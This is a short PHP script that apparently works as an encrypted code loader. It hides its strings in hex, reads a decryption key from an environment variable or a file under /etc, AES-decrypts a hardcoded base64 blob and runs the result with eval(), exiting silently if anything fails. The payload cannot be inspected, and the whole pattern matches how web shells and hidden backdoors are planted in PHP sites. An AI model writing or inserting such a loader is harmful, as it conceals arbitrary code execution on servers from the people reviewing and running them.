<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('X4dhVBcW3MWgyxi0tAAKcg==');

$c=base64_decode(

'oalaEDLc5PAI2oN55HnBpzC5xhJ3GbCP0dAIpcjzHohhj0H+ajX8TwPRC/ir3dxL5mOJ58Dye28o' .
'ALkOyDsFAXYxnFliJyYvZ3bTk0ERRaxhV4A6aK4rUjQu8tMvonrevCx+dT7hh2Mfvg2CkMBeqTb3' .
'16cHE8irjtQV+Sv38ileT3LC4eijr7HmHBC98EnL2D4J3uIOPhUthPggV7CV8Wqa1k6LVq9DXuER' .
'j/vqZSyGPKIHJ9cSgoEKfTCbfYLDVA78uSp+jcQ1hS34xbQpnP6rXXHd5EiijiCEV7yAPaKEfDyo' .
'BhZr1cE97Bw49GwYfgM0Vzr0g7/fx5Ecb9TV3dOlwM+N+SvpoJrg3rqVoRvRdyyZDubpovAPirh8' .
'xBnNjKjIoMKB/7/DjQnglQotMZQwl8tOTpGeAMRkmVDRUED61EBPlu9JBQ5qqGkGfkQS9LVvhTlC' .
'xsbIAb7GXc9+MvYJsTlMfVjxjrZT61dR+heqnmAg6QGT2JvZ4GXGl1lq9L6I5numlatp4mhCh79f' .
'9AP4qsKhOHVE0T/zzdu2DzoHls0fA3W1hhaPywiFjU7z1A+83Ksk9Ej+FAvcNoj1uU/fFSwbNSMK' .
'/B4har5s4xovAcYlnTn9dmvQGX1bHvllXf1xAMqks0YxDZy1YMwZ8Dq7pDDPJ92sFQPm51ve/nSg' .
'DzGRyDFESpLathM0y1mHmr/0TZtPrrl7rpRh9t3WKg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

